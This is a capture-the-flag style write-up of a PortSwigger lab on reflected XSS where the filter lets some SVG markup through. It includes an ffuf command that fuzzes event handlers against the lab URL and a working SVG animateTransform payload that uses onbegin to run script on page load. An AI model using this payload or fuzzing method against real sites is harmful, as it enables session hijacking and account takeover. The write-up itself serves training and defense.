# Challenge Name: Reflected XSS with some SVG markup allowed
# Platform: PortSwigger
# Difficulty: Practitioner

## 1. Vulnerability Type
Reflected Cross-site Scripting

## 2. Root Cause
Web application blocks common html tags, but it does not block `svg` tag which leads to security gap.

## 3. Attack Surface
`/?search=`

## 4. Exploit Method
To exploit this, first attacker needs to know what events he can use. Finding available events is simple: attacker can use simple events enumeration with `svg` tag. He can do it with the following command:
```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -u "https://0a3500b3037f1e6080a78ab900de0023.h1-web-security-academy.net/?search=<svg%20FUZZ=1>" \
-w ~/Desktop/events.txt -mc all -t 1
```
Note: attacker uses `-t 1` because web application has rate limit and does not work when receives lots of requests.

After running this command attacker gets 200 ok code on `onbegin` event. Afterwards, attacker can just prompt some LLM to give him minimal `svg` tag with auto animation. It is important to use `animateTransform` tag because others are blocked by web application. After getting payload, attacker is ready to exploit the web page.
## 5. Payload / Technique
```html
<svg width="200" height="200">
  <rect x="50" y="50" width="50" height="50" fill="blue">
    <animateTransform attributeName="transform"
                      type="rotate"
                      from="0 75 75"
                      to="360 75 75"
                      dur="2s"
                      begin="0s"
                      onbegin="alert("XSS")" />
  </rect>
</svg>
```
This payload creates a rectangle figure that animates as soon as page loads, therefore, executing XSS injection without user interaction.
## 6. Impact
Attacker can run arbitrary javascript in victim's browser, that can lead to session hijacking, account takeover, and phishing.

## 7. Reusable Pattern
Check if mechanisms like WAF (Web Application Firewall) or other security systems block all tags with all their events. If there is some ublocked tag with unblocked event, that can lead to potential exploitation.

## 8. Key Takeaway
Always make sure to block all tags and events that user can exploit.


